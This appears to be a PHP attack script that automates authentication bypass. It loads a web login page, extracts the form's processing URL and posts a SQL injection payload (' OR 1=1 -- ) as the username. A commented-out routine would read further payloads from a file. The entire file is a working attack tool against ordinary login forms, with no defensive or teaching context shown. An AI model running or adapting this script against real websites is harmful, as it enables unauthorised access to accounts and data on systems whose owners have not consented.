<?php
  function loadURL($url) {
    // load the login html and find the login processing url of the login form
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
  }

  function bypassAuthentication($prefix, $login_page) {
    $ch = curl_init();
    // login html
    $login_html = new simple_html_dom();
    $login_html -> load($login_page);
    
    // find the login processing url
    $login_form = $login_html -> find("form")[0];
    $process_url = $prefix . $login_form -> action;


    // after getting the process_url, send a post request with SQL injection payload
    $injections_payloads = loadSQLInjectionPayloads();
    // try all the payloads until we get the response
    $injection_payload = $injections_payloads[0];

    $postFields = array(
      "username" => $injection_payload,
      "password" => "Abc888888",
      "button" => ''
    );

    $options = array(
      CURLOPT_URL            => $process_url,
      CURLOPT_RETURNTRANSFER => true,   // return web page
      CURLOPT_HEADER         => false,  // don't return headers
      CURLOPT_FOLLOWLOCATION => true,   // follow redirects
      CURLOPT_POST           => true,
      CURLOPT_POSTFIELDS     => http_build_query($postFields)
    ); 

    curl_setopt_array($ch, $options);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
  }

  function loadSQLInjectionPayloads() {
    return array("' OR 1=1 -- ");
    // $payloads = array();
    // $lines = file('authentication_bypass\\payloads.txt');

    // foreach($lines as $payload) {
    //   $payloads[] = $payload;
    // }
    // return $payloads;
  }
?>